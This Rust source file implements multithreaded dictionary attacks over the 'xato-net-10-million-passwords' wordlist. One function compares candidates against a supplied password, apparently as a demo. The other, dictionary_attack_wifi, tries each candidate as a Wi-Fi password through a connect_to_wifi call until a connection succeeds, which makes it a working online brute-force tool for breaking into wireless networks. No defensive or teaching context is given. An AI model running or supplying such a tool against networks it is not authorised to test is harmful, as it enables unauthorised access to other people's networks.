use crate::files;
use crate::wifi;
use std::sync::{Arc, Mutex};
use std::thread;

pub fn dictionary_attack(pwd: String, num_of_thread: u8) {
    let pass = Arc::new(Mutex::new(pwd));
    let found = Arc::new(Mutex::new(false));
    let mut handles = vec![];

    for i in 1..num_of_thread + 1 {
        let pass = Arc::clone(&pass);
        let found = Arc::clone(&found);

        let handle = thread::spawn(move || {
            let mut num_of_attempt = 0;
            if let Ok(mut lines) = files::read_lines("sample/xato-net-10-million-passwords-dup.txt")
            {
                if i > 1 {
                    for _ in 1..i {
                        lines.next();
                    }
                }

                println!("thread started: {}", i);
                for line in lines.step_by(num_of_thread.into()) {
                    let word = pass.lock().unwrap();
                    let mut found_key = found.lock().unwrap();
                    if *found_key == true {
                        println!("\n break, number of attempts: {}", num_of_attempt);
                        break;
                    }
                    if let Ok(ip) = line {
                        if *word == ip {
                            println!("\nfound {}", *word);
                            println!("\n break, number of attempts: {}", num_of_attempt);
                            *found_key = true;
                            break;
                        } else {
                            num_of_attempt += 1;
                            continue;
                        }
                    }
                }
                println!("\n not found. thread: {}", i);
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }
}

pub fn dictionary_attack_wifi(num_of_thread: u8) {
    let found = Arc::new(Mutex::new(false));
    let mut handles = vec![];

    for i in 1..num_of_thread + 1 {
        let found = Arc::clone(&found);

        let handle = thread::spawn(move || {
            let mut num_of_attempt = 0;
            if let Ok(mut lines) = files::read_lines("sample/xato-net-10-million-passwords-dup.txt")
            {
                if i > 1 {
                    for _ in 1..i {
                        lines.next();
                    }
                }

                println!("thread started: {}", i);
                for line in lines.step_by(num_of_thread.into()) {
                    let mut found_key = found.lock().unwrap();
                    if *found_key == true {
                        println!("\n break, number of attempts: {}", num_of_attempt);
                        break;
                    }
                    if let Ok(ip) = line {
                        let res = wifi::connect_to_wifi(&ip);
                        match res {
                            Ok(connected) => {
                                if connected {
                                    println!("\nfound {}", ip);
                                    println!("\n break, number of attempts: {}", num_of_attempt);
                                    *found_key = true;
                                    break;
                                } else {
                                    num_of_attempt += 1;
                                    continue;
                                }
                            }
                            Err(_e) => {
                                num_of_attempt += 1;
                                continue;
                            }
                        }
                    }
                }
                println!("\n not found. thread: {}", i);
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }
}
